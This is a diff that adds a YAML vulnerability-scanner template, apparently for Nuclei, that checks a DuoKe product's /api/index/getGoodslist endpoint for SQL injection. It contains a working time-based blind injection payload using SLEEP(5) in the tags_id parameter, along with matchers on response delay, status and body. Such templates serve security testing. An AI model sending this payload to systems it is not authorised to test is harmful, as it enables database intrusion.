@@ -1,0 +1,27 @@
+id: DuoKe-getGoodslist-sqlInjection
+
+info:
+  name: DuoKe-getGoodslist-sqlInjection
+  author: iSee857
+  severity: high
+  description: DuoKe-getGoodslist-sqlInjection
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /api/index/getGoodslist?tags_id=1'%29+AND+%28SELECT+1904+FROM+%28SELECT%28SLEEP%285%29%29%29xCMp%29--+OGeQ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'msg":"ok'
